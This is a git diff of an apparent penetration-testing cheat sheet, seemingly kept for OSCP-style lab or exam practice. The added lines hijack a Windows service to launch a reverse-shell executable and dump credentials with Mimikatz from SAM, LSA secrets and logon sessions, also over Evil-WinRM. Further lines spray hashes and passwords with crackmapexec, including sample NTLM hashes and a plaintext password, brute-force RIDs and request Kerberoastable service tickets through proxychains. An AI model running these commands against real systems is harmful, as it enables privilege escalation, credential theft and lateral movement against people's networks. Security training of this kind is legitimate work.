@@ -3118,9 +3118,37 @@ Note 2: If you get a notice that the port is in use, even after you have killed 
 	Show differences:
 		git diff
 ```
+# Modifying Services For Reverse Shell
+ 	sc.exe config AWSLiteAgent binpath= "C:\users\j.rock\Desktop\reverse.exe"
+	sc.exe stop AWSLiteAgent
+	sc.exe start AWSLiteAgent
+ 
+ 	Note: Must have permissions to modify the service
 
-# AD Exploitation Checklist
+# Windows Post Exploitation Checklist
 ```
+-- Check AutoLogon Creds (Run Winpeas as NT AUthority / System)
+-- Note down all Username:Password pairs
+-- Dump Creds with Mimikatz or Meterpreter
+    log
+    lsadump::sam
+    lsadump::secrets
+    lsadump::cache
+    sekurlsa::logonpasswords
+    sekurlsa::logonPasswords full
+-- Read Powershell History
+	(Get-PSReadlineOption).HistorySavePath
+	type $history.txt
+-- Invoking Mimikatz Over Evil-Winrm
+	.\mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit" >> mimikatz.txt
+```
+# AD Checklist
+```
+Find Open Ports:
+	proxychains nmap 10.10.139.154 -Pn -p 21,22,80,445,2222,8000,3389,5040,5585,5586
+Check Writable Services
+	Check_writeable_services.ps1
+	Get-Writeable-Services
 evil-winrm
 crackmapexec: Check hashes or available services against 
 	Check all 6 services:
@@ -3131,10 +3159,13 @@ crackmapexec: Check hashes or available services against
 		rdp
 		ftp
 	crackmapexec smb 10.10.121.142 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc --shares
-	crackmapexec winrm 10.10.121.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -x "whoami"
-# Hash Spraying
+
+Hash Spraying
 	crackmapexec smb internal_ips.txt -u jim -p Castello1! --users
+List Users
 	crackmapexec smb 172.16.102.30 -u jim -p Castello1! --rid-brute
-impacket-GetUserSPNs
+Check Other Accounts
 	proxychains impacket-GetUserSPNs -dc-ip 10.10.92.146 -request oscp.exam/web_svc
 ```
+
+
